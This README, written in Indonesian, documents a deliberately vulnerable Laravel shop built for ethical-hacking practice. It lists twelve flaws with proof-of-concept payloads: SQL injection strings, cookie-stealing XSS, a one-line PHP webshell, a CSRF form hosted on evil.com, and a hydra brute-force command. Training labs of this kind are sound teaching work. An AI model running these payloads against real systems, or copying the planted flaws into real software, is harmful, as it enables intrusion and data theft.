# 🛍️ Warung Pak Budi — Vulnerable Web App Lab

<div align="center">

![Laravel](https://img.shields.io/badge/Laravel-11.x-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)
![PHP](https://img.shields.io/badge/PHP-8.2+-777BB4?style=for-the-badge&logo=php&logoColor=white)
![MySQL](https://img.shields.io/badge/MySQL-8.0-4479A1?style=for-the-badge&logo=mysql&logoColor=white)
![Status](https://img.shields.io/badge/Status-Intentionally%20Vulnerable-red?style=for-the-badge)
![Purpose](https://img.shields.io/badge/Purpose-Ethical%20Hacking%20Lab-orange?style=for-the-badge)

> ⚠️ **PERINGATAN**: Aplikasi ini **SENGAJA DIBUAT RENTAN** untuk tujuan edukasi
> !

</div>

---

## 📖 Tentang Lab Ini

**Warung Pak Budi** adalah aplikasi web e-commerce yang sengaja dibangun dengan berbagai kerentanan keamanan (*intentionally vulnerable*) sebagai **media latihan bug hunting dan ethical hacking**.

Lab ini terinspirasi dari project seperti:
- [DVWA (Damn Vulnerable Web Application)](https://dvwa.co.uk/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

Namun berfokus pada konteks **web e-commerce berbasis Laravel** — salah satu framework PHP paling populer di Indonesia.

---

## 🎯 Tujuan Lab

- Memahami kerentanan web yang umum terjadi di aplikasi e-commerce nyata
- Berlatih teknik **bug hunting** dan **penetration testing** secara legal & aman
- Memahami cara kerja eksploitasi dan dampaknya terhadap sistem
- Melatih kemampuan analisis kode sumber (*source code review*)
- Persiapan untuk **Bug Bounty**, **CTF**, dan **Sertifikasi Keamanan** (CEH, OSCP, dll.)

---

## 🛠️ Tech Stack

| Komponen | Teknologi |
|---|---|
| **Framework** | Laravel 11.x |
| **Bahasa** | PHP 8.2+ |
| **Database** | MySQL 8.0 |
| **Frontend** | Blade Template + Tailwind CSS (CDN) |
| **Auth** | Laravel Breeze |
| **Storage** | Laravel Storage (local disk) |

---

## 🚀 Cara Setup & Menjalankan

### Prasyarat
- PHP >= 8.2
- Composer
- MySQL
- Git

### Langkah Instalasi

```bash
# 1. Clone repository
git clone https://github.com/harukato588/Warung_Pak-Budi-.git
cd Warung_Pak-Budi-

# 2. Install dependencies
composer install

# 3. Salin file environment
cp .env.example .env

# 4. Generate application key
php artisan key:generate

# 5. Konfigurasi database di .env
# DB_DATABASE=toko_online
# DB_USERNAME=root
# DB_PASSWORD=

# 6. Buat database & jalankan migrasi + seeder
php artisan migrate --seed

# 7. Buat symbolic link storage
php artisan storage:link

# 8. Jalankan server
php artisan serve
```

Buka browser: `http://127.0.0.1:8000`

---

## 🔴 Daftar Kerentanan

Lab ini mengandung **12 kerentanan** yang dapat ditemukan dan dieksploitasi:

---

### 1. 💉 SQL Injection (SQLi)
- **Lokasi**: `GET /products?search=`
- **Tipe**: Error-based & UNION-based
- **Deskripsi**: Input pencarian dimasukkan langsung ke raw SQL query tanpa prepared statement
- **PoC**:
  ```
  /products?search=' OR '1'='1
  /products?search=' UNION SELECT 1,email,password,4,5,6 FROM users-- -
  ```
- **Tools**: `sqlmap`, Burp Suite

---

### 2. 🖥️ Cross-Site Scripting / XSS (Reflected + Stored)
- **Lokasi**:
  - Reflected: `GET /products?search=`
  - Stored: Nama & deskripsi produk di `/products`, `/products/{id}`, `/cart`
- **Deskripsi**: Output tidak di-escape menggunakan `{!! !!}` alih-alih `{{ }}`
- **PoC Reflected**: `/products?search=<script>alert(document.cookie)</script>`
- **PoC Stored**: Buat produk dengan nama `<img src=x onerror=alert(1)>`

---

### 3. 🔓 IDOR — Insecure Direct Object Reference
- **Lokasi**: `GET /order/{id}`, `POST /cart/remove/{id}`, `GET /orders`
- **Deskripsi**: Tidak ada pengecekan kepemilikan resource — user bisa akses data milik user lain hanya dengan menebak ID
- **PoC**: Login sebagai user biasa, lalu akses `/order/1` milik user lain
- **PoC lain**: `GET /orders` — menampilkan **semua** order dari seluruh user

---

### 4. 🚪 Broken Access Control
- **Lokasi**: `/admin/products/create`, `/admin/products/{id}/edit`, `/admin/products/{id}` (DELETE)
- **Deskripsi**: Route admin hanya mengecek status login, tidak mengecek role/permission admin
- **PoC**: Login sebagai user biasa → akses `/admin/products/create` → berhasil!

---

### 5. 📦 Mass Assignment
- **Lokasi**: Semua model (`Product`, `Order`, `OrderItem`) — `$guarded = []`
- **Deskripsi**: Semua field model bisa diisi dari HTTP request tanpa filter
- **PoC**: Kirim field tambahan saat register: `is_admin=1&role=admin`

---

### 6. 📂 Insecure File Upload
- **Lokasi**: `POST /admin/products` (field `image`)
- **Deskripsi**: Tidak ada validasi tipe/ekstensi file — file `.php` bisa diupload sebagai webshell
- **PoC**:
  1. Upload file `shell.php` dengan isi: `<?php system($_GET['cmd']); ?>`
  2. Akses: `http://127.0.0.1:8000/storage/products/shell.php?cmd=whoami`

---

### 7. 💰 Price Manipulation (Business Logic Flaw)
- **Lokasi**: `POST /checkout`
- **Deskripsi**: Total harga diterima dari client-side (hidden field & POST body) tanpa verifikasi server
- **PoC**: Intercept request checkout dengan Burp Suite → ubah `total_price=1` → checkout seharga Rp 1!

---

### 8. 📉 Negative Quantity / Inventory Manipulation
- **Lokasi**: `POST /cart/{product_id}`
- **Deskripsi**: Field `quantity` tidak divalidasi — bisa bernilai negatif atau sangat besar
- **PoC**: Kirim `quantity=-100` → stok produk naik secara ilegal setelah checkout

---

### 9. 🔄 CSRF — Cross-Site Request Forgery
- **Lokasi**: `POST /cart/remove/{id}` (tidak ada `@csrf`)
- **Deskripsi**: Beberapa route tidak memiliki perlindungan CSRF token
- **PoC**: Buat halaman HTML di domain lain yang auto-submit form ke endpoint ini

```html
<!-- evil.com/attack.html -->
<form method="POST" action="http://127.0.0.1:8000/cart/remove/1">
  <input type="submit" value="Klaim Hadiah!">
</form>
<script>document.forms[0].submit();</script>
```

---

### 10. 🔍 Sensitive Data Exposure
- **Lokasi**: `GET /api/debug` *(tanpa autentikasi!)*
- **Deskripsi**: Endpoint debug terbuka untuk publik, membocorkan data sensitif
- **Data yang bocor**:
  - Semua user beserta password hash
  - `APP_KEY` aplikasi Laravel
  - Username & password database
  - Isi `$_SERVER` (environment server)
- **PoC**: `curl http://127.0.0.1:8000/api/debug`

---

### 11. 🔑 Broken Authentication — No Rate Limiting
- **Lokasi**: `POST /login`
- **Deskripsi**: Tidak ada pembatasan percobaan login — rentan terhadap serangan brute force
- **PoC**:
  ```bash
  hydra -l admin@test.com -P /usr/share/wordlists/rockyou.txt \
    127.0.0.1 http-post-form \
    "/login:email=^USER^&password=^PASS^:These credentials"
  ```

---

### 12. 📢 Information Disclosure via Error Messages
- **Lokasi**: Semua halaman (karena `APP_DEBUG=true`)
- **Deskripsi**: Stack trace Laravel lengkap dengan path file dan versi framework tampil saat error
- **PoC**: `GET /products/99999999` → muncul full stack trace + versi PHP & Laravel

---

## 🗂️ Urutan Latihan yang Disarankan

```
1. Recon          → /api/debug             (dapatkan semua kredensial)
2. SQLi           → /products?search=      (dump seluruh database)
3. IDOR           → /order/1,2,3...        (baca data order user lain)
4. File Upload    → /admin/products        (upload webshell → RCE)
5. Stored XSS     → Nama produk            (inject script berbahaya)
6. Priv Escalation → Mass Assignment       (jadikan akun jadi admin)
7. Logic Bug      → Price Manipulation     (beli produk seharga Rp 1)
```

---

## 🛡️ Tools yang Disarankan

| Tool | Kegunaan |
|---|---|
| **Burp Suite** | Intercept & modifikasi HTTP request |
| **sqlmap** | Otomasi SQL Injection |
| **OWASP ZAP** | Scanner kerentanan web |
| **Hydra** | Brute force login |
| **Nikto** | Web server scanner |
| **curl / Postman** | Manual HTTP request testing |

---

## ⚠️ Disclaimer

> Proyek ini dibuat **murni untuk tujuan edukasi** dalam bidang keamanan siber.
> Semua kerentanan ditanamkan secara **sengaja** untuk keperluan latihan.
>
> **Dilarang keras** menggunakan teknik atau pengetahuan yang didapat dari lab ini
> untuk menyerang sistem tanpa izin (unauthorized access).
>
> Gunakan hanya di **environment lokal / lab terisolasi**.
> Pembuat tidak bertanggung jawab atas penyalahgunaan materi ini.

---

## 👤 Author

**HARU_KATO** — Proyek latihan ethical hacking & bug hunting

---

<div align="center">
  <i>Happy Hacking! 🔐 — Gunakan ilmu untuk kebaikan.</i>
</div>
